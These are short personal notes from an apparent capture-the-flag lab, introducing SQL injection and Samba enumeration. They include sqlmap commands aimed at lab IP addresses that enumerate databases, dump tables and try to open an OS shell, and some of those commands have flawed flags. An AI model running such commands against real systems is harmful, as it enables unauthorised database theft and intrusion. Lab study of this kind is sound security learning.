## Sql Injection: Intro ##

* SQL injection is the art of modifying a SQL query so you can get access to the target's database. This technique is often used to get user's data such as passwords, emails etc. SQL injection is one of the most common web vulnerabilities.

### Sqlmap ###

* Sqlmap is arguably the most popular automated SQL injection tool out there. It checks for various types of injections and has plenty of customization options.
* Use `man sqlmap` for more info.

### Manual sql enumeration ###

* [OWASP/SQL-Injection](https://owasp.org/www-community/attacks/SQL_Injection)

### Walk through ###

* The syntax to use sqlmap is 

```ZSH
> sqlmap -u <url> -p <parameter to test>
> sqlmap -u http://10.10.175.67?msg=1 -p msg
> sqlmap -u http://10.10.175.67?msg=1 -D mysql -level 3 --dump-all --os-shell
```
* The above last two lines didn't work!

```ZSH
> sqlmap -u "http://10.10.116.134?msg=1" --dbs --columns -D tests --level 3
after we got the number of tables and columns, we can type

> sqlmap -u "http://10.10.116.134?msg=1" -dump -T <table-name> -C <column-name> -D <database-name>

> sqlmap -u "http://10.10.116.134?msg=1" -dump -T lol -C flag -D tests
```

* And it works and fetches the data to our local machine.

## Samba ##

* `Smbmap` is the tool used to enumerate samba shares.
* It allows pentesters to run commands (if they have permissions), download and upload files, and overall very useful for smb enumeration.
* `smbclient` allows you to do most of the things you can do with smbmap, and it also offers you an interactive prompt.
* `impacket` is a collection of extremely useful windows scripts. It is worth mentioning here, as it has many scripts available that use samba to enumerate and even gain shell access to windows machines. All scripts can be found here.
